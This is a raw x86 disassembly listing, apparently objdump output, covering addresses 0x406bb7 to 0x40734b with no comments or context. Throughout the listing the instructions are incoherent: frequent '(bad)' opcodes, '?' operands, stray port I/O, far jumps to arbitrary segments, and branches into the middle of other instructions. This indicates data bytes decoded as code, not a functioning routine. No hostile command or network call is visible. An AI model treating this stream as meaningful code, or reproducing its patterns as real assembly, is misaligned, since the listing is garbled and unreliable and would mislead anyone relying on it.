  406bb7:	int    0x1
  406bb9:	inc    eax
  406bba:	mov    ah,0x8f
  406bbc:	inc    eax
  406bbd:	in     al,dx
  406bbe:	inc    edx
  406bbf:	mov    ebx,0x831f548a
  406bc4:	jmp    0x406b96
  406bc6:	cwde   
  406bc7:	test   DWORD PTR [eiz*2+0x1deefbbf],edi
  406bce:	sub    eax,0xa00189b0
  406bd3:	fdiv   st,st(3)
  406bd5:	les    esi,FWORD PTR [eax]
  406bd7:	enter  0x1e2b,0xfc
  406bdb:	inc    eax
  406bdc:	cli    
  406bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bde:	leave  
  406bdf:	jp     0x406c5c
  406be1:	dec    ecx
  406be3:	cwde   
  406be4:	(bad)  
  406be5:	iret   
  406be6:	xlat   BYTE PTR ds:[ebx]
  406be7:	and    eax,0xe1265e09
  406bec:	jecxz  0x406bc0
  406bee:	sub    al,0x63
  406bf0:	(bad)  
  406bf1:	pop    ebx
  406bf2:	arpl   ax,di
  406bf4:	fisubr WORD PTR ds:0x9234e611
  406bfa:	ins    BYTE PTR es:[edi],dx
  406bfb:	jnp    0x406c5d
  406bfd:	xchg   esi,eax
  406bfe:	sbb    ch,BYTE PTR gs:[ebx]
  406c01:	(bad)  
  406c03:	(bad)  
  406c04:	stos   DWORD PTR es:[edi],eax
  406c05:	or     eax,0x3bec17da
  406c0a:	popf   
  406c0b:	test   eax,0x4de6202f
  406c10:	in     eax,0xa2
  406c12:	test   BYTE PTR [eax-0x7e985011],dl
  406c18:	mov    bh,0x9d
  406c1a:	mov    al,0xb6
  406c1c:	pusha  
  406c1d:	fidivr WORD PTR [edi]
  406c1f:	add    al,0x8a
  406c21:	not    BYTE PTR [esi+0x13]
  406c24:	(bad)  
  406c25:	imul   eax,DWORD PTR [esi-0x68],0xc77b6a8b
  406c2c:	sbb    DWORD PTR [ecx],esi
  406c2e:	ins    BYTE PTR es:[edi],dx
  406c2f:	into   
  406c30:	jl     0x406c4e
  406c32:	scas   eax,DWORD PTR es:[edi]
  406c33:	push   esi
  406c34:	jecxz  0x406c6a
  406c36:	adc    dl,BYTE PTR [ecx]
  406c38:	inc    ecx
  406c39:	sbb    ch,cl
  406c3b:	neg    BYTE PTR [edi-0x74]
  406c3e:	int    0x21
  406c40:	push   ebp
  406c41:	test   DWORD PTR [esi],eax
  406c43:	int    0x3c
  406c45:	not    BYTE PTR [edx-0x71]
  406c48:	xchg   ebp,eax
  406c49:	mov    esp,0x2168138
  406c4e:	sbb    eax,0xbe89b7f0
  406c53:	xor    BYTE PTR [esi-0x23],dh
  406c56:	xchg   ecx,eax
  406c57:	lods   al,BYTE PTR ds:[esi]
  406c58:	jo     0x406c03
  406c5a:	sbb    DWORD PTR [eax+0x5f],esi
  406c5d:	stos   BYTE PTR es:[edi],al
  406c5e:	xchg   ecx,eax
  406c5f:	inc    DWORD PTR [edi+ebp*1]
  406c62:	test   BYTE PTR [edx-0x3a7a156f],bh
  406c68:	dec    esp
  406c69:	call   0x6200d097
  406c6e:	cwde   
  406c6f:	lea    ebp,[esi]
  406c71:	fimul  DWORD PTR [ecx+ebp*4+0x564e80ef]
  406c78:	(bad)  [ebp-0x2dfe38f2]
  406c7e:	adc    BYTE PTR [esi-0x3908ca7c],ah
  406c84:	jno    0x406cb2
  406c86:	mov    al,ds:0x7676f13d
  406c8b:	xor    eax,0x777e85e0
  406c90:	idiv   DWORD PTR [ebx+edi*8]
  406c93:	imul   edx,DWORD PTR [ecx],0x39
  406c96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c97:	pop    ebx
  406c98:	or     BYTE PTR [edx],al
  406c9a:	pop    esi
  406c9b:	(bad)  
  406c9c:	dec    ebx
  406c9d:	fist   WORD PTR [esi]
  406c9f:	lds    ebx,FWORD PTR [ebx-0x456f798b]
  406ca5:	jmp    0x522:0xefe5a132
  406cac:	push   0xa949284e
  406cb1:	adc    bh,BYTE PTR [ecx+0x68]
  406cb4:	sbb    BYTE PTR [ecx],bh
  406cb6:	cmp    ah,BYTE PTR [ecx+0xe]
  406cb9:	mov    BYTE PTR [ecx-0x966089e],cl
  406cbf:	stos   BYTE PTR es:[edi],al
  406cc0:	nop
  406cc1:	and    BYTE PTR [ecx],bh
  406cc3:	cmp    DWORD PTR [eax],ebp
  406cc5:	test   BYTE PTR [ebx+0x3b923a5b],al
  406ccb:	jge    0x406cc3
  406ccd:	sbb    eax,0xaced2107
  406cd2:	out    dx,eax
  406cd3:	xor    al,0xc3
  406cd5:	inc    esp
  406cd6:	or     al,0xd1
  406cd8:	addr16 xchg ebp,eax
  406cda:	jle    0x406c6e
  406cdc:	gs mov bh,0x5
  406cdf:	sti    
  406ce0:	into   
  406ce1:	call   0x9a5:0xbcc30c42
  406ce8:	mov    DWORD PTR [edx+0x361da530],edx
  406cee:	cmp    al,0x26
  406cf0:	mov    edi,0xbf17b113
  406cf5:	pop    eax
  406cf6:	dec    ebx
  406cf7:	out    0x15,eax
  406cf9:	add    eax,0x4b4a9b26
  406cfe:	and    DWORD PTR [ebp+ebx*8-0x26f6951a],edi
  406d05:	mov    DWORD PTR [eax+0x7c99fb29],esi
  406d0b:	fst    DWORD PTR [ebx]
  406d0d:	mov    dh,0xcd
  406d0f:	pop    eax
  406d10:	js     0x406cba
  406d12:	lds    esp,FWORD PTR [edi+edx*2-0x34559b0c]
  406d19:	push   ebx
  406d1a:	out    0x59,eax
  406d1c:	dec    esi
  406d1d:	cmp    eax,0x775d38fa
  406d22:	aam    0x9d
  406d24:	jnp    0x406cdd
  406d26:	mov    ds:0xcec306d9,eax
  406d2b:	inc    eax
  406d2c:	sub    al,0x64
  406d2e:	mov    esi,0x280beda9
  406d33:	out    dx,al
  406d34:	cli    
  406d35:	in     eax,dx
  406d36:	popw   ss
  406d38:	das    
  406d39:	clc    
  406d3a:	outs   dx,DWORD PTR ds:[esi]
  406d3b:	sbb    DWORD PTR [ebx-0x68df737e],ebp
  406d41:	aaa    
  406d42:	sub    DWORD PTR [edx+0x6d24647c],ecx
  406d48:	sbb    ah,bl
  406d4a:	pusha  
  406d4b:	jg     0x406dc9
  406d4d:	addr16 jmp 0xe8c8:0xbcea110c
  406d55:	and    bh,BYTE PTR [edi-0x2eaf6515]
  406d5b:	cmp    eax,0x897ee148
  406d60:	iret   
  406d61:	mov    edi,0xa04108ec
  406d66:	sbb    eax,0x4ac32465
  406d6b:	xor    ebp,DWORD PTR [ecx+0x6e]
  406d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d6f:	cmc    
  406d70:	mov    ecx,0xd6760194
  406d75:	jl     0x406d86
  406d77:	int3   
  406d78:	and    BYTE PTR [edx],ah
  406d7a:	pop    eax
  406d7b:	into   
  406d7c:	ss hlt 
  406d7e:	push   es
  406d7f:	(bad)
  406d82:	pop    esp
  406d83:	dec    ecx
  406d84:	xchg   DWORD PTR [esi],ebx
  406d86:	nop
  406d87:	js     0x406dfa
  406d89:	cmp    eax,0x65ceee78
  406d8e:	das    
  406d8f:	loope  0x406dfc
  406d91:	push   0x436e292b
  406d96:	ss pop ds
  406d98:	mov    al,0x54
  406d9a:	popa   
  406d9b:	jno    0x406d6c
  406d9d:	mov    ds:0x1a918cea,al
  406da2:	(bad)  
  406da3:	xor    ah,BYTE PTR [ecx+0x210c09b]
  406da9:	and    cl,BYTE PTR cs:[ebx-0x74]
  406dad:	jmp    0x25ee:0xf0719f00
  406db4:	mov    ecx,DWORD PTR [edx+0x2b]
  406db7:	rol    BYTE PTR [ecx+0x76e9b754],1
  406dbd:	inc    esp
  406dbe:	fstp   st(2)
  406dc0:	push   edx
  406dc1:	mov    ch,0x3a
  406dc3:	fwait
  406dc4:	and    BYTE PTR [esi],0x9c
  406dc7:	aaa    
  406dc8:	sub    DWORD PTR [edi+0x1a],ebx
  406dcb:	scas   al,BYTE PTR es:[edi]
  406dcc:	jp     0x406d5c
  406dce:	imul   DWORD PTR [ebx+0x41ac8dff]
  406dd4:	or     BYTE PTR [eax+0xd],bh
  406dd7:	inc    eax
  406dd8:	sub    DWORD PTR [esp+esi*8-0x2d],0x6317d133
  406de0:	pushf  
  406de1:	inc    eax
  406de2:	jb     0x406def
  406de4:	dec    esp
  406de5:	mov    dh,0x56
  406de7:	sbb    ah,BYTE PTR [edi+0x7d322541]
  406ded:	shl    DWORD PTR [ebx],0x52
  406df0:	scas   eax,DWORD PTR es:[edi]
  406df1:	sub    DWORD PTR [eax+0x507b0d07],0xffffff9f
  406df8:	xchg   esi,eax
  406df9:	cli    
  406dfa:	dec    ebp
  406dfb:	scas   al,BYTE PTR es:[edi]
  406dfc:	sbb    DWORD PTR [edx],ecx
  406dfe:	push   edx
  406dff:	jp     0x406e73
  406e01:	inc    esi
  406e02:	aad    0xf
  406e04:	xor    ecx,DWORD PTR [edx+0xd929e5f]
  406e0a:	and    al,0xc5
  406e0c:	sub    cl,bl
  406e0e:	sahf   
  406e0f:	pusha  
  406e10:	fstp   DWORD PTR [ebx-0x4]
  406e13:	fadd   DWORD PTR [edi+eax*8-0x35d0033b]
  406e1a:	push   0xffffffc7
  406e1c:	ds jnp 0x406df0
  406e1f:	xor    bh,BYTE PTR [edx-0x1be770ea]
  406e25:	sub    ah,BYTE PTR [edx-0x17]
  406e28:	je     0x406dbf
  406e2a:	inc    ebp
  406e2b:	ja     0x406e15
  406e2d:	(bad)  
  406e2e:	cmp    edi,DWORD PTR [ecx+0xa2a8ae9]
  406e34:	jbe    0x406e69
  406e36:	std    
  406e37:	(bad)  
  406e38:	int3   
  406e39:	psubsw mm3,QWORD PTR [ebx]
  406e3c:	ins    DWORD PTR es:[edi],dx
  406e3d:	mov    ecx,0x3c0f0e5a
  406e42:	fild   WORD PTR [edx-0x1a9ba2a]
  406e48:	mov    eax,0xdd66ff8a
  406e4d:	jnp    0x406ddd
  406e4f:	mov    ebx,0xfcfe096c
  406e54:	add    BYTE PTR [ecx-0x22b67711],0x5
  406e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5c:	pop    esp
  406e5d:	cmp    DWORD PTR [esi-0x5e],0x53
  406e61:	je     0x406e86
  406e63:	test   al,0xef
  406e65:	leave  
  406e66:	call   0x7ed73c60
  406e6b:	sar    DWORD PTR [edi],1
  406e6d:	ret    0x5e8f
  406e70:	or     ah,ch
  406e72:	mov    ?,esi
  406e74:	std    
  406e75:	push   ss
  406e76:	dec    edi
  406e77:	adc    BYTE PTR [esi-0x67],cl
  406e7a:	and    al,0xf5
  406e7c:	(bad)  
  406e7d:	fdivp  st(4),st
  406e7f:	mov    esi,?
  406e81:	lds    ebx,FWORD PTR [edi+0x16]
  406e84:	out    dx,al
  406e85:	icebp  
  406e86:	dec    eax
  406e87:	ret    0x1062
  406e8a:	ss push ebx
  406e8c:	out    dx,eax
  406e8d:	es aas 
  406e8f:	aam    0x26
  406e91:	sbb    ch,BYTE PTR [edi]
  406e93:	out    dx,eax
  406e94:	outs   dx,BYTE PTR ds:[esi]
  406e95:	ja     0x406e70
  406e97:	cmp    DWORD PTR [edx+0x597a4c81],esp
  406e9d:	inc    esi
  406e9e:	dec    edi
  406e9f:	out    0x13,eax
  406ea1:	mov    ss,WORD PTR [esi-0x4479f63b]
  406ea7:	aad    0x1f
  406ea9:	and    ah,dl
  406eab:	(bad)  
  406eac:	xor    eax,0xdfe29ace
  406eb1:	add    eax,0xdb4a2cae
  406eb6:	add    ah,BYTE PTR [ebx-0x29]
  406eb9:	inc    bl
  406ebb:	aad    0x79
  406ebd:	mov    esi,0x5c3ee13f
  406ec2:	dec    ecx
  406ec3:	or     edx,DWORD PTR [ebx+ebx*2-0x2d]
  406ec7:	ja     0x406ede
  406ec9:	xchg   esp,eax
  406eca:	inc    esi
  406ecb:	mov    ebx,0x22ece94
  406ed0:	push   edx
  406ed1:	sbb    al,0x8c
  406ed3:	mov    ch,0x86
  406ed5:	sub    ebx,ebx
  406ed7:	mov    ah,0x27
  406ed9:	or     ah,dh
  406edb:	sub    BYTE PTR [ebp+0x5b],0xf5
  406edf:	add    eax,ecx
  406ee1:	jae    0x406ea9
  406ee3:	jae    0x406ec6
  406ee5:	or     DWORD PTR [edx+0x14c7b0a3],ecx
  406eeb:	in     eax,dx
  406eec:	lods   al,BYTE PTR ds:[esi]
  406eed:	and    esi,DWORD PTR [edi]
  406eef:	and    BYTE PTR [ebp+0x62],dh
  406ef2:	jo     0x406ec6
  406ef4:	add    ebx,DWORD PTR [edi+edx*1-0xbbd468a]
  406efb:	lods   al,BYTE PTR ds:[esi]
  406efc:	adc    DWORD PTR [esi],ecx
  406efe:	cdq    
  406eff:	ins    BYTE PTR es:[edi],dx
  406f00:	into   
  406f01:	jmp    0x80f6df6f
  406f06:	sub    bh,bl
  406f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f09:	in     al,0xc1
  406f0b:	into   
  406f0c:	sbb    DWORD PTR [eax+0x40bae2de],ebp
  406f12:	pop    ebp
  406f13:	cmp    ch,ah
  406f15:	pop    ebp
  406f16:	sbb    al,0x20
  406f18:	popaw  
  406f1a:	out    0xcb,eax
  406f1c:	sar    ch,cl
  406f1e:	adc    DWORD PTR [eax-0x2d531c59],ebp
  406f24:	jge    0x406f40
  406f26:	ret    
  406f27:	loop   0x406eba
  406f29:	jb     0x406f0d
  406f2b:	aas    
  406f2c:	mov    bl,0x91
  406f2e:	ss push ax
  406f31:	adc    al,0xc0
  406f33:	sub    DWORD PTR [ecx-0x5e],edx
  406f36:	inc    edi
  406f37:	mov    ebx,0x1e034cd5
  406f3c:	and    bl,BYTE PTR [eax-0x27]
  406f3f:	test   BYTE PTR [esi+ebx*2-0x6c2c3690],bl
  406f46:	dec    ecx
  406f47:	pop    eax
  406f48:	inc    ebx
  406f49:	or     eax,0x841a8d78
  406f4e:	push   edx
  406f4f:	imul   eax,DWORD PTR [eax-0x44],0xffffff83
  406f53:	mov    eax,0x3cf3fd59
  406f58:	je     0x406ee2
  406f5a:	pop    ebx
  406f5b:	ss leave 
  406f5d:	and    bh,al
  406f5f:	xor    DWORD PTR [edi-0x2a],0x6e941f6
  406f66:	jmp    0x406f54
  406f68:	jge    0x406f05
  406f6a:	out    0xd0,eax
  406f6c:	push   eax
  406f6d:	ret    
  406f6e:	jae    0x406f60
  406f70:	lea    edx,[ecx-0x5f]
  406f73:	pop    ss
  406f74:	bound  eax,QWORD PTR [edx]
  406f76:	jp     0x406ff6
  406f78:	loopne 0x406f73
  406f7a:	sahf   
  406f7b:	dec    ebx
  406f7c:	sbb    eax,0x3166d6ab
  406f81:	out    0xc5,eax
  406f83:	cmp    BYTE PTR [esi],dl
  406f85:	mov    dh,0x63
  406f87:	stos   DWORD PTR es:[edi],eax
  406f88:	out    0x23,al
  406f8a:	jnp    0x406fc4
  406f8c:	xlat   BYTE PTR ds:[ebx]
  406f8d:	xchg   esi,eax
  406f8e:	enter  0xd758,0x4
  406f92:	jp     0x406f5d
  406f94:	ja     0x406fc9
  406f96:	xlat   BYTE PTR ds:[ebx]
  406f97:	jl     0x406f4a
  406f99:	pop    edi
  406f9a:	or     DWORD PTR [edx+ebp*4],0x64
  406f9e:	aad    0xb4
  406fa0:	adc    BYTE PTR [ecx+0x7a],ch
  406fa3:	mov    ch,0x5f
  406fa5:	xor    ah,BYTE PTR [ebx+0x65]
  406fa8:	nop
  406fa9:	pusha  
  406faa:	fdivr  DWORD PTR [ecx+0x13]
  406fad:	mov    eax,ds:0x117c3a75
  406fb2:	ror    DWORD PTR [esi+0x48],cl
  406fb5:	cmp    BYTE PTR [edi+edx*2-0x3713128f],al
  406fbc:	in     eax,0x7d
  406fbe:	(bad)  
  406fc0:	loope  0x406ff1
  406fc2:	adc    eax,DWORD PTR [ecx]
  406fc4:	sbb    BYTE PTR [esi+0x75b75bc],ah
  406fca:	adc    bl,BYTE PTR [eax-0x797156ca]
  406fd0:	mov    al,BYTE PTR [eax]
  406fd2:	pop    esi
  406fd3:	ss loope 0x406f6c
  406fd6:	mov    dh,0xdd
  406fd8:	xlat   BYTE PTR ds:[ebx]
  406fd9:	mov    esi,0xd996cfbe
  406fde:	sub    BYTE PTR [edx-0x4e],al
  406fe1:	aaa    
  406fe2:	xchg   edi,eax
  406fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fe4:	xor    eax,0xcfa06d7b
  406fe9:	imul   edi,DWORD PTR [edi],0x1c
  406fec:	pop    ss
  406fed:	clc    
  406fee:	in     al,dx
  406fef:	aad    0xd3
  406ff1:	jo     0x407071
  406ff3:	fwait
  406ff4:	out    0x56,al
  406ff6:	push   ecx
  406ff7:	cli    
  406ff8:	enter  0x8751,0x8f
  406ffc:	xor    eax,0xf8a9ae4e
  407001:	mov    dl,0xd3
  407003:	mov    ch,0x56
  407005:	jns    0x40703e
  407007:	fadd   DWORD PTR [ecx-0xca8904d]
  40700d:	fsubp  st(7),st
  40700f:	sahf   
  407010:	pop    ds
  407011:	xor    BYTE PTR [ecx+0x44],bh
  407014:	adc    BYTE PTR [esi-0x53],cl
  407017:	call   0x86bac50a
  40701c:	xor    eax,0xf945789b
  407021:	ret    0xfda8
  407024:	jp     0x407032
  407026:	(bad)  
  407027:	or     DWORD PTR [ebx],esi
  407029:	xchg   ebx,eax
  40702a:	call   0xa2fc:0x8a9928d5
  407031:	lock aaa 
  407033:	mov    al,0x4c
  407035:	enter  0xf2f5,0xf8
  407039:	rcr    DWORD PTR [edx],1
  40703b:	pop    esp
  40703c:	mov    ds:0xc299e38a,eax
  407041:	imul   ebx,DWORD PTR [ecx],0xa2f46fee
  407047:	mov    ecx,0xb2be03fb
  40704c:	arpl   WORD PTR [ebp+0x2779801d],dx
  407052:	sub    DWORD PTR [edx-0x4abd2bbc],edx
  407058:	sub    al,0x2d
  40705a:	inc    esi
  40705b:	jns    0x407026
  40705d:	cmp    DWORD PTR [ebx],ecx
  40705f:	or     ecx,DWORD PTR [eax+eax*8]
  407062:	retf   
  407063:	in     al,dx
  407064:	rol    cl,0xef
  407067:	rol    DWORD PTR [edi+0x15],cl
  40706a:	and    bl,ah
  40706c:	or     DWORD PTR [eax-0x50da61e1],edx
  407072:	mov    eax,0xc597e730
  407077:	xchg   ebx,eax
  407078:	push   ecx
  407079:	push   ecx
  40707a:	nop
  40707b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40707c:	rcl    BYTE PTR [ecx+0x7b6a3792],cl
  407082:	sbb    cl,0x24
  407085:	test   BYTE PTR [ebp-0x2f94516a],ah
  40708b:	arpl   WORD PTR [edx-0x19ca1fa1],si
  407091:	arpl   WORD PTR [edi-0x7],sp
  407094:	jnp    0x4070c4
  407096:	loopne 0x4070b2
  407098:	jp     0x4070cd
  40709a:	xor    al,0x6
  40709c:	and    al,0x29
  40709e:	inc    ecx
  40709f:	call   0x2f9be3ec
  4070a4:	les    edx,FWORD PTR [esi+0x59]
  4070a7:	add    al,0x2d
  4070a9:	mov    ebp,0x37701369
  4070ae:	leave  
  4070af:	imul   ebx,ebx,0x6f
  4070b2:	inc    edx
  4070b3:	loop   0x4070a3
  4070b5:	aas    
  4070b6:	xor    DWORD PTR fs:[eax+0x5f],0x6a
  4070bb:	push   0xa52ac88e
  4070c0:	inc    edi
  4070c1:	fist   DWORD PTR ds:0x638f069
  4070c7:	pushf  
  4070c8:	call   0x3c18a162
  4070cd:	cdq    
  4070ce:	(bad)  
  4070cf:	fwait
  4070d0:	stos   BYTE PTR es:[edi],al
  4070d1:	lea    ebx,[eax+ebx*8+0x3a]
  4070d5:	pop    edx
  4070d6:	adc    BYTE PTR [esi+0x16c2d7a2],0xb
  4070dd:	push   esp
  4070de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070df:	xor    al,0xad
  4070e1:	xlat   BYTE PTR ds:[ebx]
  4070e2:	sbb    DWORD PTR [ecx+esi*2-0x3067a54c],esp
  4070e9:	inc    ebp
  4070ea:	retf   0x58cd
  4070ed:	sbb    edx,ecx
  4070ef:	sub    BYTE PTR [edx],cl
  4070f1:	imul   ebx,DWORD PTR [ecx+0x322f5b32],0x36
  4070f8:	cs adc eax,0x53c28b02
  4070fe:	ret    0x7d76
  407101:	imul   ebx,DWORD PTR [edx-0x60],0xfffffff2
  407105:	mov    edi,0xf4ba7c2c
  40710a:	lds    ecx,FWORD PTR [esp+ecx*4]
  40710d:	jmp    0x2bce:0xfbdd0f68
  407114:	call   0x71c9:0xc0fec483
  40711b:	repz jmp 0x7d3660be
  407121:	popf   
  407122:	clc    
  407123:	add    BYTE PTR [ecx],ch
  407125:	sub    edx,0xffffffc6
  407128:	fstp   TBYTE PTR [ebx+0x6d5ddb2f]
  40712e:	push   ss
  40712f:	pusha  
  407130:	cmp    bl,0x4a
  407133:	popa   
  407134:	dec    eax
  407135:	cmc    
  407136:	psrad  mm6,QWORD PTR [ecx]
  407139:	inc    ebx
  40713a:	(bad)  
  40713b:	jmp    0x986f:0x763e2126
  407142:	xchg   edi,eax
  407143:	mov    bl,0xf7
  407145:	scas   eax,DWORD PTR es:[edi]
  407146:	cli    
  407147:	cmp    al,0x4c
  407149:	push   esp
  40714a:	xchg   ebp,eax
  40714b:	push   ebx
  40714c:	sub    cl,BYTE PTR [esi]
  40714e:	popf   
  40714f:	gs cmp esp,eax
  407152:	add    eax,0xaef0831f
  407157:	clc    
  407158:	ds cdq 
  40715a:	scas   eax,DWORD PTR es:[edi]
  40715b:	or     eax,0xef683547
  407160:	and    ebx,ebx
  407162:	dec    ecx
  407163:	inc    esi
  407164:	mov    ?,WORD PTR [esi-0x7b]
  407167:	les    eax,FWORD PTR [esp+ebx*8-0x5e501a7e]
  40716e:	(bad)  
  40716f:	(bad)  [edx+0x77]
  407172:	dec    esi
  407173:	aas    
  407174:	cld    
  407175:	sahf   
  407176:	pop    ebp
  407177:	cmc    
  407178:	js     0x40718b
  40717a:	mov    ?,esp
  40717c:	inc    esi
  40717d:	dec    edi
  40717e:	stos   BYTE PTR es:[edi],al
  40717f:	cmp    BYTE PTR [esi+ebp*1+0xd],al
  407183:	or     DWORD PTR [edx],esp
  407185:	sub    ebx,esp
  407187:	sub    BYTE PTR [ecx-0x15],0xb3
  40718b:	call   0x38137e44
  407190:	dec    esi
  407191:	jno    0x407149
  407193:	mov    dl,0xd4
  407195:	mov    cl,0xf3
  407197:	jecxz  0x40718f
  407199:	push   ds
  40719a:	cmp    DWORD PTR [eax+ebx*2+0x4d],ebx
  40719e:	xchg   ecx,eax
  40719f:	inc    ecx
  4071a0:	xor    DWORD PTR [edi-0x80],ecx
  4071a3:	xchg   si,ax
  4071a5:	sti    
  4071a6:	cmp    eax,0x2aeb4cb3
  4071ab:	or     edi,DWORD PTR [esi-0x7f]
  4071ae:	out    dx,al
  4071af:	add    BYTE PTR [eax],al
  4071b1:	add    ecx,DWORD PTR [ebx+0x10]
  4071b4:	inc    esi
  4071b5:	ins    BYTE PTR es:[edi],dx
  4071b6:	xlat   BYTE PTR ds:[ebx]
  4071b7:	lods   eax,DWORD PTR ds:[esi]
  4071b8:	cmc    
  4071b9:	cmp    eax,0xcec027c4
  4071be:	std    
  4071bf:	sub    ebp,ebp
  4071c1:	aad    0x11
  4071c3:	shl    edx,cl
  4071c5:	push   eax
  4071c6:	xchg   ebp,eax
  4071c7:	and    ah,BYTE PTR [edi]
  4071c9:	mov    DWORD PTR [edx+0xf],ebp
  4071cc:	popa   
  4071cd:	dec    esp
  4071ce:	sub    eax,eax
  4071d0:	fisttp DWORD PTR [edx+0x504626cf]
  4071d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071d7:	ficom  WORD PTR fs:[ebx-0xfb6a6b9]
  4071de:	fdivr  st(6),st
  4071e0:	inc    ecx
  4071e1:	ror    BYTE PTR [bx+di-0x10d3],0xd
  4071e7:	aam    0xfe
  4071e9:	ins    DWORD PTR es:[edi],dx
  4071ea:	mov    ch,0xba
  4071ec:	push   esi
  4071ed:	call   0x4439:0x80014ca7
  4071f4:	lods   al,BYTE PTR ds:[esi]
  4071f5:	mov    al,ds:0xca4eb60e
  4071fa:	jo     0x407236
  4071fc:	popf   
  4071fd:	aas    
  4071fe:	or     DWORD PTR [edx],edi
  407200:	(bad)  
  407201:	fwait
  407202:	mov    ds:0x10e4c2ee,eax
  407207:	lods   eax,DWORD PTR ds:[esi]
  407208:	push   ss
  407209:	mov    al,0xae
  40720b:	adc    edi,eax
  40720d:	(bad)  
  40720e:	(bad)  
  40720f:	retf   
  407210:	pop    ecx
  407211:	sbb    DWORD PTR [esp+ecx*4-0x1e],ebx
  407215:	xchg   ecx,eax
  407216:	ins    BYTE PTR es:[edi],dx
  407217:	xor    al,0xfe
  407219:	inc    ebp
  40721a:	aas    
  40721b:	popf   
  40721c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40721d:	inc    ecx
  40721e:	gs int 0xca
  407221:	adc    DWORD PTR [edi],0xffffffa7
  407224:	and    ch,BYTE PTR [ebp+eax*4-0x4d1d1f05]
  40722b:	cmc    
  40722c:	jmp    0x4071f0
  40722e:	(bad)  
  40722f:	and    eax,ecx
  407231:	leave  
  407232:	mov    ds:0x8b177d42,eax
  407237:	mov    ds:0xb54421cc,eax
  40723c:	stc    
  40723d:	mov    esp,DWORD PTR [ecx]
  40723f:	xchg   esi,eax
  407240:	dec    ecx
  407241:	retf   
  407242:	mov    ds,WORD PTR [ebp+0x2e47ba9]
  407248:	sahf   
  407249:	pop    esp
  40724a:	je     0x407273
  40724c:	cmp    eax,0x79c44d9a
  407251:	ja     0x407230
  407253:	add    al,0x47
  407255:	cwde   
  407256:	cmp    ecx,esi
  407258:	bound  edi,QWORD PTR [eax]
  40725a:	outs   dx,BYTE PTR ds:[esi]
  40725b:	(bad)  
  40725c:	(bad)  
  40725d:	cmp    al,BYTE PTR [ecx]
  40725f:	loopne 0x40720f
  407261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407262:	stc    
  407263:	(bad)  
  407264:	mov    al,0xff
  407266:	out    0x67,eax
  407268:	sub    al,BYTE PTR [ebp+0x43a9b6f8]
  40726e:	push   0x19
  407270:	jne    0x40721b
  407272:	jge    0x407213
  407274:	xor    BYTE PTR [ebp+0x10],ah
  407277:	add    ebx,DWORD PTR [edx+0x5a]
  40727a:	jmp    0x4072c7
  40727c:	and    al,0x9f
  40727e:	ins    DWORD PTR es:[edi],dx
  40727f:	div    BYTE PTR [edi]
  407281:	pop    eax
  407282:	jno    0x4072ad
  407284:	pop    ebp
  407285:	pushf  
  407286:	pusha  
  407287:	rol    BYTE PTR [ebp+0x6b617844],cl
  40728d:	xchg   ebx,eax
  40728e:	leave  
  40728f:	mov    ds:0x97007779,eax
  407294:	jb     0x40726a
  407296:	call   0xa917:0xc35a7a
  40729d:	fild   DWORD PTR [edx+ecx*4+0x62]
  4072a1:	xor    BYTE PTR [esi+0x78],cl
  4072a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072a5:	mov    ah,0x2d
  4072a7:	(bad)  
  4072a8:	mov    bl,0xb8
  4072aa:	leave  
  4072ab:	and    edi,0xffffffab
  4072ae:	sub    esi,DWORD PTR [esp+ebp*2+0x11d8efb2]
  4072b5:	or     BYTE PTR es:[esi+0x76e8ba67],ch
  4072bc:	sbb    al,0x98
  4072be:	shl    BYTE PTR [esi+ebx*8-0x61c8fdf],cl
  4072c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072c6:	test   eax,0x271cf241
  4072cb:	aam    0x70
  4072cd:	push   0xf2dd7aea
  4072d2:	push   ebp
  4072d3:	mov    esi,0xa3df4e3d
  4072d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072d9:	cwde   
  4072da:	jo     0x407329
  4072dc:	jbe    0x407331
  4072de:	dec    ecx
  4072df:	xchg   esi,eax
  4072e0:	cld    
  4072e1:	or     ecx,ecx
  4072e3:	push   ss
  4072e4:	lock jmp 0x407334
  4072e7:	mov    esi,0x56c91fcf
  4072ec:	or     eax,0x9bc7f4c3
  4072f1:	sbb    BYTE PTR [edx],0x69
  4072f4:	std    
  4072f5:	jns    0x407309
  4072f7:	and    al,0x9e
  4072f9:	jb     0x407361
  4072fb:	repz mov eax,ds:0x9f4d6a0
  407301:	push   0xffffff85
  407303:	inc    ecx
  407304:	std    
  407305:	push   es
  407306:	fldl2e 
  407308:	aas    
  407309:	sub    al,0x71
  40730b:	jle    0x4072a1
  40730d:	cld    
  40730e:	daa    
  40730f:	dec    eax
  407310:	xchg   edx,eax
  407311:	dec    esi
  407312:	out    dx,eax
  407313:	add    BYTE PTR [ebp-0x34],0xa7
  407317:	adc    dh,al
  407319:	int    0x72
  40731b:	(bad)  
  40731c:	sub    eax,0x2e4fce6a
  407321:	shl    BYTE PTR [eax+0x10],0xc5
  407325:	jo     0x4072ab
  407327:	cmp    dl,al
  407329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40732a:	in     eax,dx
  40732b:	and    cl,BYTE PTR [esi]
  40732d:	inc    ecx
  40732e:	retf   
  40732f:	or     al,0xd5
  407331:	add    al,0x21
  407333:	shl    BYTE PTR [ebx],cl
  407335:	cdq    
  407336:	iret   
  407337:	stos   BYTE PTR es:[edi],al
  407338:	cmp    BYTE PTR [esp+edi*4+0x36],cl
  40733c:	inc    esp
  40733d:	mov    ebp,esp
  40733f:	outs   dx,BYTE PTR ds:[esi]
  407340:	and    BYTE PTR [eax+0x7b],0x41
  407344:	push   ecx
  407345:	jbe    0x407395
  407347:	pop    edx
  407348:	pushf  
  407349:	stc    
  40734a:	inc    ebp
  40734b:	ret    0x2c8c
